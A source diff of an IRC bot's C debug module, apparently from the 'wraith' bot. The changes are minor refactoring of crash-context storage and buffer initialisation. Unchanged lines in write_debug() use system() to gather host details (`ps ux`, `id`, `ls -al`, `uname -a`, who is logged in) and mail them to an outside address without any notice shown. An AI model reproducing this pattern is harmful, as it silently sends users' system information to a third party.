@@ -29,6 +29,14 @@ extern char		 tempdir[], origbotname[], ver[];
 extern time_t		 now, buildts;
 extern jmp_buf           alarmret;
 
+#ifdef DEBUG_CONTEXT
+/* Context storage for fatal crashes */
+char    cx_file[16][30]; 
+char    cx_note[16][256];
+int     cx_line[16] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
+int     cx_ptr = 0;
+#endif /* DEBUG_CONTEXT */
+
 void setlimits()
 {
 #ifndef DEBUG_MEM
@@ -64,14 +72,19 @@ void init_debug()
   int i = 0;
   for (i = 0; i < 16; i ++)
     Context;
+
+#ifdef DEBUG_CONTEXT
+  egg_bzero(&cx_file, sizeof cx_file);
+  egg_bzero(&cx_note, sizeof cx_note);
+#endif /* DEBUG_CONTEXT */
 }
 
-int     sdebug = 0;             /* enable debug output? */
+int		sdebug = 0;             /* enable debug output? */
 
 void sdprintf (char *format, ...)
 {
   if (sdebug) {
-    char s[2001];
+    char s[2001] = "";
     va_list va;
 
     va_start(va, format);
@@ -86,11 +99,6 @@ void sdprintf (char *format, ...)
 
 
 #ifdef DEBUG_CONTEXT
-/* Context storage for fatal crashes */
-char    cx_file[16][30];
-char    cx_note[16][256];
-int     cx_line[16];
-int     cx_ptr = 0;
 
 static int      nested_debug = 0;
 
@@ -126,7 +134,6 @@ void write_debug()
       char buff[255] = "";
 
       egg_snprintf(buff, sizeof(buff), "cat << EOFF >> %sbleh\nDEBUG from: %s\n`date`\n`w`\n---\n`who`\n---\n`ls -al`\n---\n`ps ux`\n---\n`uname -a`\n---\n`id`\n---\n`cat %s`\nEOFF", tempdir, origbotname, buf);
-
       system(buff);
       egg_snprintf(buff, sizeof(buff), "cat %sbleh |mail wraith@shatow.net", tempdir);
       system(buff);
@@ -135,8 +142,9 @@ void write_debug()
     unlink(buf);
     exit(1);                    /* Dont even try & tell people about, that may
                                    have caused the fault last time. */
-  } else
+  } else {
     nested_debug = 1;
+  }
 
   egg_snprintf(tmpout, sizeof tmpout, "* Last 3 contexts: %s/%d [%s], %s/%d [%s], %s/%d [%s]",
                                   cx_file[cx_ptr-2], cx_line[cx_ptr-2], cx_note[cx_ptr-2][0] ? cx_note[cx_ptr-2] : "",
@@ -170,7 +178,6 @@ void write_debug()
     killsock(x);
     close(x);
     {
-
       char date[81] = "", *w = NULL, *who = NULL, *ps = NULL, *uname = NULL, *id = NULL, *ls = NULL, *debug = NULL, *msg = NULL, buf2[DIRMAX] = "";
 
       egg_strftime(date, sizeof date, "%c %Z", gmtime(&now));
@@ -340,7 +347,7 @@ void init_signals()
 /* Context */
 void eggContext(const char *file, int line, const char *module)
 {
-  char x[31], *p;
+  char x[31] = "", *p = NULL;
 
   p = strrchr(file, '/');
   if (!module) {
@@ -355,16 +362,16 @@ void eggContext(const char *file, int line, const char *module)
 
 /* Called from the ContextNote macro.
  */
-void eggContextNote(const char *file, int line, const char *module,
-                    const char *note)
+void eggContextNote(const char *file, int line, const char *module, const char *note)
 {
-  char x[31], *p;
+  char x[31] = "", *p = NULL;
 
   p = strrchr(file, '/');
   if (!module) {
     strncpyz(x, p ? p + 1 : file, sizeof x);
-  } else
+  } else {
     egg_snprintf(x, 31, "%s:%s", module, p ? p + 1 : file);
+  }
   cx_ptr = ((cx_ptr + 1) & 15);
   strcpy(cx_file[cx_ptr], x);
   cx_line[cx_ptr] = line;
@@ -387,4 +394,3 @@ void eggAssert(const char *file, int line, const char *module)
   fatal(STR("ASSERT FAILED -- CRASHING!"), 1);
 }
 #endif /* DEBUG_ASSERT */
-
